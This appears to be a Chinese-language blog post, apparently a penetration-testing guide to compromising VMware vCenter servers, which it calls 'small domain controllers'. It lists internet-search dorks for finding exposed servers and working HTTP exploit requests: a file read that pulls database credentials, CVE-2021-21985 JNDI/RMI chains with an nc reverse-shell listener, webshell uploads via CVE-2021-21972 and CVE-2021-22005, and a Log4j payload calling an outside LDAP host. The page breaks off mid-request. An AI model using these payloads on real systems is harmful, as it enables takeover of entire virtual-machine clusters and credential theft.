@@ -1,0 +1,687 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>vCenter利用 | bo0s</title>
+  <meta name="author" content="hitman">
+  
+  <meta name="description" content="My Blog/Website, will Tutorials, and just my general thoughts.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="vCenter利用"/>
+  <meta property="og:site_name" content="bo0s"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/12favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 5.0.0"><link rel="stylesheet" href="/css/prism-vs.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">bo0s</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="全部文章">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="标签">
+			  <i class="fa fa-tag"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="我是谁.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/wiki/#/" title="WiKi.">
+			  <i class="fa fa-book"></i>WiKi
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tool" title="工具">
+			  <i class="fa fa-space-shuttle"></i>Tool
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/logs" title="日志">
+			  <i class="fa fa-tachometer"></i>Logs
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/code/landing/" title="Discord.JS Bot Code">
+			  <i class="fa fa-code"></i>Tutorials / Code
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> vCenter利用</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p><img src="/images/vCenter.png" alt="upload successful"></p>
+<blockquote>
+<p>vCenter，一般指 VMware vCenter Server。拿下vCenter之后不仅仅是一台服务器权限，还包括其中的其他虚拟机权限，拿下它不亚于域控的价值，所以也称cVenter为小域控。</p>
+</blockquote>
+<a id="more"></a> 
+
+
+
+
+
+
+
+<h1 id="VMware-vCenter"><a href="#VMware-vCenter" class="headerlink" title="VMware vCenter"></a>VMware vCenter</h1><blockquote>
+<p>Vcenter是用来控制虚拟环境的，是一个集权系统，那么拿下它，就等同于拿下了它控制的所有虚拟主机，所以也称之为小域控.</p>
+</blockquote>
+<h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><ul>
+<li>VMware Inc</li>
+</ul>
+<blockquote>
+<p>**VMware Inc ** 是一家软件公司。它开发了许多产品，尤其是各种云解决方案 。它的云解决方案包括云产品，数据中心产品和桌面产品等。</p>
+</blockquote>
+<ul>
+<li>vSphere</li>
+</ul>
+<blockquote>
+<p><strong>vSphere</strong> 是在数据中心产品下的一套软件。vSphere 类似微软的 Office 办公套件，Office 办公套件包含了许多软件如 Word，Excel，Access 等。和 Office 一样，vSphere 也是一个软件的集合。它包括了 vCenter Server， ESXi 和 vSphere client，是整套虚拟化部署方案的总和。</p>
+</blockquote>
+<ul>
+<li>ESXi</li>
+</ul>
+<blockquote>
+<p><strong>ESXi</strong> 是 vSphere 中最重要的一个组件。ESXi 是虚拟化服务。所有的虚拟机都是运行在 ESXi 服务上面。</p>
+</blockquote>
+<ul>
+<li>vSphere Client</li>
+</ul>
+<blockquote>
+<p><strong>vSphere (web) client</strong> 是一个管理平台，它能够直接管理多个不同的 ESXi 主机，包含许多进阶功能：集群故障转移等。而 ESXi 自带的管理平台只能管理自身所处的 ESXi 主机。而 vSphere client 有更加详细的性能监控，批量更新接管所有 ESXi 系统版本。通过资源池也可以规划虚拟机资源占用。</p>
+</blockquote>
+<ul>
+<li>vCenter Server</li>
+</ul>
+<blockquote>
+<p>在 ESXi 6.0 之前是通过 C/S 架构来管理 ESXi 集群的，没有 web 端，且安装环境较为苛刻，必须为 Server 版本的服务器才可以安装。在 6.0 版本之后，官方已经取消了 C/S 架构的客户端，转而采用了 web 管理平台，又被称之为 vSphere web client。而部署了 vSphere web client 的服务器被称之为<strong>vCenter Server</strong></p>
+</blockquote>
+<h2 id="在线指纹"><a href="#在线指纹" class="headerlink" title="在线指纹"></a>在线指纹</h2><ul>
+<li><code>app=&quot;vmware-vCenter&quot;</code></li>
+<li><code>title=&quot;+ ID_VC_Welcome +&quot;</code></li>
+<li><code>&quot; ID_VC_Welcome +&quot; &amp;&amp; country=&quot;JP&quot;</code></li>
+</ul>
+<h2 id="版本探测"><a href="#版本探测" class="headerlink" title="版本探测"></a>版本探测</h2><h3 id="SDK-XML"><a href="#SDK-XML" class="headerlink" title="SDK XML"></a>SDK XML</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.121</span><span class="regexp">/sdk/</span>vimServiceVersions.xml</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="调用SOAP-API"><a href="#调用SOAP-API" class="headerlink" title="调用SOAP API"></a>调用SOAP API</h3><blockquote>
+<p>通过调用 VMWare Sphere 组件的 SOAP API获取版本信息</p>
+</blockquote>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sdk/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.121</span><br><span class="line"><span class="attribute">Content-Length</span>: 579</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;soap:Envelope</span><br><span class="line">    xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span><br><span class="line">    xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;</span><br><span class="line">    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;</span><br><span class="line">    &lt;soap:Header&gt;</span><br><span class="line">        &lt;operationID&gt;00000001-00000001&lt;/operationID&gt;</span><br><span class="line">    &lt;/soap:Header&gt;</span><br><span class="line">    &lt;soap:Body&gt;</span><br><span class="line">        &lt;RetrieveServiceContent</span><br><span class="line">            xmlns=&quot;urn:internalvim25&quot;&gt;</span><br><span class="line">            &lt;_this xsi:type=&quot;ManagedObjectReference&quot; type=&quot;ServiceInstance&quot;&gt;ServiceInstance&lt;/_this&gt;</span><br><span class="line">        &lt;/RetrieveServiceContent&gt;</span><br><span class="line">    &lt;/soap:Body&gt;</span><br><span class="line">&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="综合利用工具"><a href="#综合利用工具" class="headerlink" title="综合利用工具"></a>综合利用工具</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/Schira4396/VcenterKiller"><em>Vcenter</em>Killer</a></li>
+</ul>
+<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><blockquote>
+<p>VMware vCenter 存在任意文件读取漏洞，可读取 vCenter 配置文件获得管理帐号密码进而控制 vCenter 平台及其管理的虚拟机集群。</p>
+<p>Fofa Dork：<code>title=&quot;ID_VC_Welcome&quot;</code></p>
+<p>影响版本：</p>
+<ul>
+<li>Vmware vCenter Server &lt;= 6.5.0</li>
+</ul>
+</blockquote>
+<ul>
+<li>手工实现</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 由于不同的系统版本，数据库配置文件（vcdb.properties）存放位置不同</span></span><br><span class="line">对于 vCenter<span class="built_in"> Server </span>5.5 及更低版本：</span><br><span class="line">Windows 2008 - C:\ProgramData\VMware\VMware VirtualCenter</span><br><span class="line">其他 Windows 版本 - C:\Documents <span class="keyword">and</span> Settings\All Users\Application Data\VMware\VMware VirtualCenter\</span><br><span class="line">对于 vCenter<span class="built_in"> Server </span>6.0、6.5、6.7：</span><br><span class="line">C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="builtin-name">GET</span> /eam/vib?<span class="attribute">id</span>=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties HTTP/1.1</span><br><span class="line">Host: &#123;&#123;Hostname&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Nuclei中有自动化的检测poc</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/nuclei-templates/</span>vulnerabilities<span class="regexp">/vmware/</span>vmware-vcenter-lfi.yaml</span><br><span class="line"><span class="regexp">/nuclei-templates/</span>vulnerabilities<span class="regexp">/vmware/</span>vmware-vcenter-lfi-linux.yaml</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="CVE-2021-21972"><a href="#CVE-2021-21972" class="headerlink" title="CVE-2021-21972"></a>CVE-2021-21972</h3><blockquote>
+<p>默认启用的 vROps 插件（com.vmware.vropspluginui.mvc）ServicesController 类的 uploadova 接口存在未授权访问，可利用路径穿越将文件解压至特定目录实现写Webshell或写私钥</p>
+<p>影响版本：</p>
+<ul>
+<li><code>7.0 &lt;= vCenter Server &lt; 7.0 U1c</code></li>
+<li><code>6.7 &lt;= vCenter Server &lt; 6.7 U3l</code></li>
+<li><code>6.5 1e &lt;= vCenter Server &lt; 6.5 U3n</code></li>
+<li><code>4.x &lt;= Cloud Foundation (vCenter Server) &lt; 4.2</code></li>
+<li><code>3.x &lt;= Cloud Foundation (vCenter Server) &lt; 3.10.1.2</code></li>
+</ul>
+</blockquote>
+<ul>
+<li>Nuclei检测脚本</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/nuclei-templates/</span>cves<span class="regexp">/2021/</span>CVE-<span class="number">2021</span>-<span class="number">21972</span>.yaml</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/NS-Sp4ce/CVE-2021-21972">利用脚本</a></li>
+</ul>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE<span class="number">-2021</span><span class="number">-21972.</span>py -url <span class="number">192.168</span><span class="number">.1</span><span class="number">.121</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="CVE-2021-21985"><a href="#CVE-2021-21985" class="headerlink" title="CVE-2021-21985"></a>CVE-2021-21985</h3><blockquote>
+<p>默认启用的 Virtual SAN Health Check 插件（vsan-h5-client.zip）<code>/rest/*</code>接口存在未授权访问，可利用不安全的反射调用实现 RCE。该漏洞获取shell后默认是需要提权的。</p>
+<p>影响版本：</p>
+<ul>
+<li>7.0 &lt;= vCenter Server &lt; 7.0 U2b</li>
+<li>6.7 &lt;= vCenter Server &lt; 6.7 U3n</li>
+<li>6.5 &lt;= vCenter Server &lt; 6.5 U3p</li>
+<li>4.x &lt;= Cloud Foundation (vCenter Server) &lt; 4.2.1</li>
+<li>3.x &lt;= Cloud Foundation (vCenter Server) &lt; 3.10.2.1</li>
+</ul>
+</blockquote>
+<ul>
+<li>Nuclei检测脚本</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/nuclei-templates/</span>cves<span class="regexp">/2021/</span>CVE-<span class="number">2021</span>-<span class="number">21985</span>.yaml</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/xnianq/cve-2021-21985_exp?tab=readme-ov-file">利用脚本</a></li>
+</ul>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 在VPS上执行</span><br><span class="line">java -cp JNDI-Injection-Bypass<span class="number">-1.0</span>-SNAPSHOT-all.jar payloads.EvilRMIServer <span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span></span><br><span class="line"></span><br><span class="line"># 在VPS上监听</span><br><span class="line">nc -lvvp <span class="number">5555</span></span><br><span class="line"></span><br><span class="line"># 在VPS上执行payload</span><br><span class="line">python<span class="number">3</span> CVE<span class="number">-2021</span><span class="number">-21985</span>_exp.py https://<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span> rmi://<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>:<span class="number">1097</span>/ExecByEL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="Tomcat-RMI-出网利用链"><a href="#Tomcat-RMI-出网利用链" class="headerlink" title="Tomcat RMI 出网利用链"></a>Tomcat RMI 出网利用链</h5><ul>
+<li>Step 1 setTargetObject to null</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ui/h5-vsan/rest/proxy/service/&amp;vsanProviderUtils_setVmodlHelper/setTargetObject</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.121</span><br><span class="line"><span class="attribute">User-Agent</span>: python-requests/2.23.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 23</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;: [null]&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Step 2 setStaticMethod to payload</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ui/h5-vsan/rest/proxy/service/&amp;vsanProviderUtils_setVmodlHelper/setStaticMethod</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.121</span><br><span class="line"><span class="attribute">User-Agent</span>: python-requests/2.23.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 57</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;: [&quot;javax.naming.InitialContext.doLookup&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Step 3 setTargetMethod to doLookup</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ui/h5-vsan/rest/proxy/service/&amp;vsanProviderUtils_setVmodlHelper/setTargetMethod</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.80.155</span><br><span class="line"><span class="attribute">User-Agent</span>: python-requests/2.23.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 29</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;: [&quot;doLookup&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Step 4 setArguments with payload args</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ui/h5-vsan/rest/proxy/service/&amp;vsanProviderUtils_setVmodlHelper/setArguments</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.121</span><br><span class="line"><span class="attribute">User-Agent</span>: python-requests/2.23.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 56</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;: [[&quot;rmi://8.8.8.8:1099/f0x&quot;]]&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Step 5 initial payload class and methods</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ui/h5-vsan/rest/proxy/service/&amp;vsanProviderUtils_setVmodlHelper/prepare</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.121</span><br><span class="line"><span class="attribute">User-Agent</span>: python-requests/2.23.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 23</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;: [null]&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Step 6 trigger method invoke</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ui/h5-vsan/rest/proxy/service/&amp;vsanProviderUtils_setVmodlHelper/invoke</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.121</span><br><span class="line"><span class="attribute">User-Agent</span>: python-requests/2.23.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 23</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;: [null]&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="不出网利用"><a href="#不出网利用" class="headerlink" title="不出网利用"></a>不出网利用</h5><blockquote>
+<p>结合了SSRF直接通过 <code>data:text/html;base64,</code> 方式加载压缩包，在 <code>driverOfflineBundle</code> 的方法中会自动解压提取内部的xml，导致不出网触发漏洞</p>
+</blockquote>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ui/h5-vsan/rest/proxy/service/vmodlContext/loadVmodlPackages</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.121</span><br><span class="line"><span class="attribute">User-Agent</span>: python-requests/2.23.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 893</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;: [[&quot;https://localhost:443/vsanHealth/vum/driverOfflineBundle/data:text/html%3Bbase64,UEsDBBQAAAAIAKd4xVKwSBTWpQEAAIgEAAASAAAAb2ZmbGluZV9idW5kbGUueG1spVNNT9wwFLwj8R/cIKGNxNrQ3rZJJD4uSCAhtodKlIPjfZsYHDv4OZtFiP+Oay9lv1ppSy5x3pt5mRnbWQlcI5k3SmOe1M61I8b6vqfYWqmrqeUN9MY+UmMrhqKGhrNASfb3SHwCdzRHucLvvwXK1+PjE/bz+mocqEOp0XEtYImNchTnXhnBnTQ6f2/uoGYXLIuAYfigc5wkRfxhyILISZ60ZUKE4ugjeeAzThXXFb2xRgDiWSfVBOw7KRCF8b5sJ5yxQ26rpZZvKolupeJrM646KFgpNSs51hmLha2oofhnO/tyd35x+uP0jvS14Y0k9/fFNkLG1oRkbLvsLMS0kYnE1UykoZe67dzYWeDNLfBdQvmj/uClLak/E9YNUlqBWxo5SF83fewourQbos+66RQsTP5fscTPCxNGKfgNXUu1c1JRDP7p+Qem+MsYfEYHzZbDOo6NZYGtNS1Y90y0vxl50tfcwcwnQIKVPDl4IXEcRXA3C/Dg8Kkz7rvpnN+XuD4ipaVKakC/ZQsfgw8/9MFI7e/XgvlLx3eapuQ1YeupxAUWb1BLAQIfABQAAAAIAKd4xVKwSBTWpQEAAIgEAAASACQAAAAAAAAAIAAAAAAAAABvZmZsaW5lX2J1bmRsZS54bWwKACAAAAAAAAEAGADeNPEi2VnXAd408SLZWdcBm/yF3shZ1wFQSwUGAAAAAAEAAQBkAAAA1QEAAAAA#&quot;]]&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ui/h5-vsan/rest/proxy/service/systemProperties/getProperty</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.121</span><br><span class="line"><span class="attribute">User-Agent</span>: python-requests/2.23.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 32</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;: [&quot;output&quot;,null]&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="CVE-2021-22005"><a href="#CVE-2021-22005" class="headerlink" title="CVE-2021-22005"></a>CVE-2021-22005</h3><blockquote>
+<p>Analytics 服务相关端点存在目录穿越写文件，可以直接上传 Webshell 文件，并获取 root 权限。</p>
+<p>影响版本：</p>
+<ul>
+<li><code>vCenter Server 7.0 &lt; 7.0 U2c build-18356314</code></li>
+<li><code>vCenter Server 6.7 &lt; 6.7 U3o build-18485166</code></li>
+<li><code>Cloud Foundation (vCenter Server) 4.x &lt; KB85718 (4.3)</code></li>
+<li><code>Cloud Foundation (vCenter Server) 3.x &lt; KB85719 (3.10.2.2)</code></li>
+</ul>
+</blockquote>
+<ul>
+<li>Nuclei检测脚本</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/nuclei-templates/</span>cves<span class="regexp">/2021/</span>CVE-<span class="number">2021</span>-<span class="number">22005</span>.yaml</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/shmilylty/cve-2021-22005-exp">利用脚本</a></li>
+</ul>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/exp -t https://<span class="number">192.168</span>.<span class="number">1.121</span> -p socks<span class="number">5</span>://<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span> -s hello.jsp</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Log4j"><a href="#Log4j" class="headerlink" title="Log4j"></a>Log4j</h3><blockquote>
+<p>CVE-2021-44228，xff header jndi注入内存马</p>
+<p>漏洞成因是Vcenter的SAML路由中，可以通过增加XFF头触发漏洞，把需要执行的命令跟在XFF后面。</p>
+</blockquote>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /websso/SAML<span class="number">2</span>/SSO/vsphere.local?SAMLRequest= HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">192.168.1.121</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win<span class="number">64</span>; x<span class="number">64</span>) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0.0.0</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">8</span>,zh-TW;q=<span class="number">0</span>.<span class="number">7</span>,zh-HK;q=<span class="number">0</span>.<span class="number">5</span>,en-US;q=<span class="number">0</span>.<span class="number">3</span>,en;q=<span class="number">0</span>.<span class="number">2</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Dnt</span>: <span class="number">1</span></span><br><span class="line"><span class="attribute">X</span>-Forwarded-For: <span class="variable">$&#123;jndi:ldap://f0x.dnslog.cn&#125;</span></span><br><span 